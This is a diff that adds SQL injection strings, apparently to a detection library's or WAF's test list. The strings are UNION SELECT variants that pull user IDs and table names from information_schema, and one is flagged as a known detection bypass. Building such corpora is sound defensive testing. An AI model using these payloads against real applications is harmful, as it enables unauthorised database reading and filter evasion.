@@ -171,3 +171,49 @@ X' - 'Y' - 0 = '1
 @version --
 @version /*
 @version/*
+
+# thanks @d0znpp
+(select id from users limit 1,1)
+(select id-0 from users limit 1,1)
+# known bypass.. for now!
+(select id,id,id,id from users limit 1,1)
+
+# some variations
+'1' union (select id from users limit 1,1)
+1 union (select id from users limit 1,1)
+xxx union (select id from users limit 1,1)
+@version union (select id from users limit 1,1)
+
+'1' union (select 1 from users limit 1,1)
+1 union (select 1 from users limit 1,1)
+xxx union (select 1 from users limit 1,1)
+@version union (select 1 from users limit 1,1)
+
+'1' union (select xxx from users limit 1,1)
+1 union (select xxx from users limit 1,1)
+xxx union (select xxx from users limit 1,1)
+@version union (select xxx from users limit 1,1)
+
+'1' union (select 's' from users limit 1,1)
+1 union (select 's' from users limit 1,1)
+xxx union (select 's' from users limit 1,1)
+@version union (select 's' from users limit 1,1)
+
+# thanks @LightOS
+-1 union(((select table_name from information_schema.tables limit 1,1)))
+'1' union(((select table_name from information_schema.tables limit 1,1)))
+@foo union(((select table_name from information_schema.tables limit 1,1)))
+id union(((select table_name from information_schema.tables limit 1,1)))
+
+# and again @LightOS
+test'-1/1/**/union(select table)
+test'-1 union(select table)
+test'-@version union (select table)
+test'-'xyz' union (select table)
+1- @version union(select table_name from information_schema.tables limit 1,1)
+1- 'xxx' union(select table_name from information_schema.tables limit 1,1)
+1- union(select table_name from information_schema.tables limit 1,1)
+@version - @version union(select table_name from information_schema.tables limit 1,1)
+@version- 'xxx' union(select table_name from information_schema.tables limit 1,1)
+@version - 5 union(select table_name from information_schema.tables limit 1,1)
+
